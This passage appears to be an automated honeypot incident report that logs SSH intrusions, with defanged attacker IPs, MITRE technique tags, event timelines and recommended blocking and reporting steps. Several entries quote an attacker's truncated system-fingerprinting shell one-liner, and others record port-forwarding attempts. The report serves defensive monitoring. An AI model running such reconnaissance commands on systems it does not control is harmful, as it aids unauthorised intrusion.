| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:11:51` | `cowrie.session.connect` |
| `2026-07-31 19:11:51` | `cowrie.client.version` |
| `2026-07-31 19:11:51` | `cowrie.client.kex` |
| `2026-07-31 19:11:52` | `cowrie.login.success` |
| `2026-07-31 19:11:53` | `cowrie.session.params` |
| `2026-07-31 19:11:53` | `cowrie.command.input` |
| `2026-07-31 19:11:53` | `cowrie.command.input` |
| `2026-07-31 19:11:53` | `cowrie.command.input` |
| `2026-07-31 19:11:53` | `cowrie.command.input` |
| `2026-07-31 19:11:53` | `cowrie.command.input` |
| `2026-07-31 19:11:53` | `cowrie.command.success` |
| `2026-07-31 19:11:53` | `cowrie.command.input` |
| `2026-07-31 19:11:53` | `cowrie.command.input` |
| `2026-07-31 19:11:53` | `cowrie.command.input` |
| `2026-07-31 19:11:53` | `cowrie.command.input` |
| `2026-07-31 19:11:53` | `cowrie.log.closed` |
| `2026-07-31 19:11:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a676707dfa07

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 19:12 |
| **Last Seen** | 2026-07-31 19:12 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:12:01` | `cowrie.session.connect` |
| `2026-07-31 19:12:02` | `cowrie.client.version` |
| `2026-07-31 19:12:02` | `cowrie.client.kex` |
| `2026-07-31 19:12:09` | `cowrie.login.success` |
| `2026-07-31 19:12:13` | `cowrie.session.params` |
| `2026-07-31 19:12:13` | `cowrie.command.input` |
| `2026-07-31 19:12:13` | `cowrie.command.input` |
| `2026-07-31 19:12:13` | `cowrie.command.input` |
| `2026-07-31 19:12:13` | `cowrie.command.input` |
| `2026-07-31 19:12:13` | `cowrie.command.input` |
| `2026-07-31 19:12:13` | `cowrie.command.success` |
| `2026-07-31 19:12:13` | `cowrie.command.input` |
| `2026-07-31 19:12:13` | `cowrie.command.input` |
| `2026-07-31 19:12:13` | `cowrie.command.input` |
| `2026-07-31 19:12:13` | `cowrie.command.input` |
| `2026-07-31 19:12:15` | `cowrie.log.closed` |
| `2026-07-31 19:12:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9467648d265

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:13 |
| **Last Seen** | 2026-07-31 19:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:13:48` | `cowrie.session.connect` |
| `2026-07-31 19:13:48` | `cowrie.client.version` |
| `2026-07-31 19:13:48` | `cowrie.client.kex` |
| `2026-07-31 19:13:49` | `cowrie.login.success` |
| `2026-07-31 19:13:51` | `cowrie.session.params` |
| `2026-07-31 19:13:51` | `cowrie.command.input` |
| `2026-07-31 19:13:51` | `cowrie.command.input` |
| `2026-07-31 19:13:51` | `cowrie.command.input` |
| `2026-07-31 19:13:51` | `cowrie.command.input` |
| `2026-07-31 19:13:51` | `cowrie.command.input` |
| `2026-07-31 19:13:51` | `cowrie.command.success` |
| `2026-07-31 19:13:51` | `cowrie.command.input` |
| `2026-07-31 19:13:51` | `cowrie.command.input` |
| `2026-07-31 19:13:51` | `cowrie.command.input` |
| `2026-07-31 19:13:51` | `cowrie.command.input` |
| `2026-07-31 19:13:51` | `cowrie.log.closed` |
| `2026-07-31 19:13:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e120cd666a6

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 19:15 |
| **Last Seen** | 2026-07-31 19:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:15:20` | `cowrie.session.connect` |
| `2026-07-31 19:15:22` | `cowrie.client.version` |
| `2026-07-31 19:15:22` | `cowrie.client.kex` |
| `2026-07-31 19:15:25` | `cowrie.login.success` |
| `2026-07-31 19:15:28` | `cowrie.session.params` |
| `2026-07-31 19:15:28` | `cowrie.command.input` |
| `2026-07-31 19:15:28` | `cowrie.command.input` |
| `2026-07-31 19:15:28` | `cowrie.command.input` |
| `2026-07-31 19:15:28` | `cowrie.command.input` |
| `2026-07-31 19:15:28` | `cowrie.command.input` |
| `2026-07-31 19:15:28` | `cowrie.command.success` |
| `2026-07-31 19:15:28` | `cowrie.command.input` |
| `2026-07-31 19:15:28` | `cowrie.command.input` |
| `2026-07-31 19:15:28` | `cowrie.command.input` |
| `2026-07-31 19:15:28` | `cowrie.command.input` |
| `2026-07-31 19:15:29` | `cowrie.log.closed` |
| `2026-07-31 19:15:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c649bf747d3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:15 |
| **Last Seen** | 2026-07-31 19:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:15:46` | `cowrie.session.connect` |
| `2026-07-31 19:15:47` | `cowrie.client.version` |
| `2026-07-31 19:15:47` | `cowrie.client.kex` |
| `2026-07-31 19:15:48` | `cowrie.login.success` |
| `2026-07-31 19:15:49` | `cowrie.session.params` |
| `2026-07-31 19:15:49` | `cowrie.command.input` |
| `2026-07-31 19:15:49` | `cowrie.command.input` |
| `2026-07-31 19:15:49` | `cowrie.command.input` |
| `2026-07-31 19:15:49` | `cowrie.command.input` |
| `2026-07-31 19:15:49` | `cowrie.command.input` |
| `2026-07-31 19:15:49` | `cowrie.command.success` |
| `2026-07-31 19:15:49` | `cowrie.command.input` |
| `2026-07-31 19:15:49` | `cowrie.command.input` |
| `2026-07-31 19:15:49` | `cowrie.command.input` |
| `2026-07-31 19:15:49` | `cowrie.command.input` |
| `2026-07-31 19:15:49` | `cowrie.log.closed` |
| `2026-07-31 19:15:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40a48b6a3d82

| Field | Detail |
|---|---|
| **Source IP** | `153.37.177[.]219` |
| **First Seen** | 2026-07-31 19:16 |
| **Last Seen** | 2026-07-31 19:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:16:22` | `cowrie.session.connect` |
| `2026-07-31 19:16:23` | `cowrie.client.version` |
| `2026-07-31 19:16:23` | `cowrie.client.kex` |
| `2026-07-31 19:16:26` | `cowrie.login.success` |
| `2026-07-31 19:16:26` | `cowrie.direct-tcpip.request` |
| `2026-07-31 19:16:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.37.177[.]219` to AbuseIPDB if not already reported
- [ ] Block `153.37.177[.]219` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a948d99e00e

| Field | Detail |
|---|---|
| **Source IP** | `62.201.228[.]210` |
| **First Seen** | 2026-07-31 19:16 |
| **Last Seen** | 2026-07-31 19:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:16:32` | `cowrie.session.connect` |
| `2026-07-31 19:16:32` | `cowrie.client.version` |
| `2026-07-31 19:16:32` | `cowrie.client.kex` |
| `2026-07-31 19:16:33` | `cowrie.login.success` |
| `2026-07-31 19:16:34` | `cowrie.direct-tcpip.request` |
| `2026-07-31 19:16:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.228[.]210` to AbuseIPDB if not already reported
- [ ] Block `62.201.228[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a381a8fa7cfc

| Field | Detail |
|---|---|
| **Source IP** | `50.188.204[.]213` |
| **First Seen** | 2026-07-31 19:17 |
| **Last Seen** | 2026-07-31 19:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:17:27` | `cowrie.session.connect` |
| `2026-07-31 19:17:28` | `cowrie.client.version` |
| `2026-07-31 19:17:28` | `cowrie.client.kex` |
| `2026-07-31 19:17:30` | `cowrie.login.success` |
| `2026-07-31 19:17:30` | `cowrie.direct-tcpip.request` |
| `2026-07-31 19:17:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.188.204[.]213` to AbuseIPDB if not already reported
- [ ] Block `50.188.204[.]213` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9aa58247c12

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:17 |
| **Last Seen** | 2026-07-31 19:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:17:43` | `cowrie.session.connect` |
| `2026-07-31 19:17:43` | `cowrie.client.version` |
| `2026-07-31 19:17:43` | `cowrie.client.kex` |
| `2026-07-31 19:17:44` | `cowrie.login.success` |
| `2026-07-31 19:17:45` | `cowrie.session.params` |
| `2026-07-31 19:17:45` | `cowrie.command.input` |
| `2026-07-31 19:17:45` | `cowrie.command.input` |
| `2026-07-31 19:17:45` | `cowrie.command.input` |
| `2026-07-31 19:17:45` | `cowrie.command.input` |
| `2026-07-31 19:17:45` | `cowrie.command.input` |
| `2026-07-31 19:17:45` | `cowrie.command.success` |
| `2026-07-31 19:17:45` | `cowrie.command.input` |
| `2026-07-31 19:17:45` | `cowrie.command.input` |
| `2026-07-31 19:17:45` | `cowrie.command.input` |
| `2026-07-31 19:17:45` | `cowrie.command.input` |
| `2026-07-31 19:17:46` | `cowrie.log.closed` |
| `2026-07-31 19:17:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a020dcff7d79

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 19:18 |
| **Last Seen** | 2026-07-31 19:18 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:18:35` | `cowrie.session.connect` |
| `2026-07-31 19:18:36` | `cowrie.client.version` |
| `2026-07-31 19:18:36` | `cowrie.client.kex` |
| `2026-07-31 19:18:43` | `cowrie.login.success` |
| `2026-07-31 19:18:47` | `cowrie.session.params` |
| `2026-07-31 19:18:47` | `cowrie.command.input` |
| `2026-07-31 19:18:47` | `cowrie.command.input` |
| `2026-07-31 19:18:47` | `cowrie.command.input` |
| `2026-07-31 19:18:47` | `cowrie.command.input` |
| `2026-07-31 19:18:47` | `cowrie.command.input` |
| `2026-07-31 19:18:47` | `cowrie.command.success` |
| `2026-07-31 19:18:47` | `cowrie.command.input` |
| `2026-07-31 19:18:47` | `cowrie.command.input` |
| `2026-07-31 19:18:47` | `cowrie.command.input` |
| `2026-07-31 19:18:47` | `cowrie.command.input` |
| `2026-07-31 19:18:49` | `cowrie.log.closed` |
| `2026-07-31 19:18:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-356aba911ff3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:19 |
| **Last Seen** | 2026-07-31 19:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:19:40` | `cowrie.session.connect` |
| `2026-07-31 19:19:40` | `cowrie.client.version` |
| `2026-07-31 19:19:40` | `cowrie.client.kex` |
| `2026-07-31 19:19:41` | `cowrie.login.success` |
| `2026-07-31 19:19:42` | `cowrie.session.params` |
| `2026-07-31 19:19:42` | `cowrie.command.input` |
| `2026-07-31 19:19:42` | `cowrie.command.input` |
| `2026-07-31 19:19:42` | `cowrie.command.input` |
| `2026-07-31 19:19:42` | `cowrie.command.input` |
| `2026-07-31 19:19:42` | `cowrie.command.input` |
| `2026-07-31 19:19:42` | `cowrie.command.success` |
| `2026-07-31 19:19:42` | `cowrie.command.input` |
| `2026-07-31 19:19:42` | `cowrie.command.input` |
| `2026-07-31 19:19:42` | `cowrie.command.input` |
| `2026-07-31 19:19:42` | `cowrie.command.input` |
| `2026-07-31 19:19:42` | `cowrie.log.closed` |
| `2026-07-31 19:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67b526bb4838

| Field | Detail |
|---|---|
| **Source IP** | `196.189.59[.]226` |
| **First Seen** | 2026-07-31 19:19 |
| **Last Seen** | 2026-07-31 19:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:19:43` | `cowrie.session.connect` |
| `2026-07-31 19:19:44` | `cowrie.client.version` |
| `2026-07-31 19:19:44` | `cowrie.client.kex` |
| `2026-07-31 19:19:45` | `cowrie.login.success` |
| `2026-07-31 19:19:46` | `cowrie.direct-tcpip.request` |
| `2026-07-31 19:19:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.59[.]226` to AbuseIPDB if not already reported
- [ ] Block `196.189.59[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-201653bd6dd9

| Field | Detail |
|---|---|
| **Source IP** | `179.185.1[.]97` |
| **First Seen** | 2026-07-31 19:19 |
| **Last Seen** | 2026-07-31 19:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:19:48` | `cowrie.session.connect` |
| `2026-07-31 19:19:48` | `cowrie.client.version` |
| `2026-07-31 19:19:48` | `cowrie.client.kex` |
| `2026-07-31 19:19:49` | `cowrie.login.success` |
| `2026-07-31 19:19:50` | `cowrie.direct-tcpip.request` |
| `2026-07-31 19:19:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.1[.]97` to AbuseIPDB if not already reported
- [ ] Block `179.185.1[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-134ddc52f969

| Field | Detail |
|---|---|
| **Source IP** | `190.12.109[.]162` |
| **First Seen** | 2026-07-31 19:19 |
| **Last Seen** | 2026-07-31 19:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:19:51` | `cowrie.session.connect` |
| `2026-07-31 19:19:52` | `cowrie.client.version` |
| `2026-07-31 19:19:52` | `cowrie.client.kex` |
| `2026-07-31 19:19:54` | `cowrie.login.success` |
| `2026-07-31 19:19:55` | `cowrie.direct-tcpip.request` |
| `2026-07-31 19:20:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.12.109[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.12.109[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fa77df05d61

| Field | Detail |
|---|---|
| **Source IP** | `36.153.164[.]122` |
| **First Seen** | 2026-07-31 19:19 |
| **Last Seen** | 2026-07-31 19:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:19:55` | `cowrie.session.connect` |
| `2026-07-31 19:19:56` | `cowrie.client.version` |
| `2026-07-31 19:19:56` | `cowrie.client.kex` |
| `2026-07-31 19:19:59` | `cowrie.login.success` |
| `2026-07-31 19:19:59` | `cowrie.direct-tcpip.request` |
| `2026-07-31 19:20:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.153.164[.]122` to AbuseIPDB if not already reported
- [ ] Block `36.153.164[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-137007b1e88b

| Field | Detail |
|---|---|
| **Source IP** | `39.183.162[.]243` |
| **First Seen** | 2026-07-31 19:20 |
| **Last Seen** | 2026-07-31 19:21 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:20:46` | `cowrie.session.connect` |
| `2026-07-31 19:20:48` | `cowrie.client.version` |
| `2026-07-31 19:20:48` | `cowrie.client.kex` |
| `2026-07-31 19:20:54` | `cowrie.login.success` |
| `2026-07-31 19:20:55` | `cowrie.direct-tcpip.request` |
| `2026-07-31 19:21:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.183.162[.]243` to AbuseIPDB if not already reported
- [ ] Block `39.183.162[.]243` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ccf8374ac0c

| Field | Detail |
|---|---|
| **Source IP** | `218.149.228[.]147` |
| **First Seen** | 2026-07-31 19:21 |
| **Last Seen** | 2026-07-31 19:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:21:01` | `cowrie.session.connect` |
| `2026-07-31 19:21:01` | `cowrie.client.version` |
| `2026-07-31 19:21:01` | `cowrie.client.kex` |
| `2026-07-31 19:21:03` | `cowrie.login.success` |
| `2026-07-31 19:21:04` | `cowrie.direct-tcpip.request` |
| `2026-07-31 19:21:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.149.228[.]147` to AbuseIPDB if not already reported
- [ ] Block `218.149.228[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
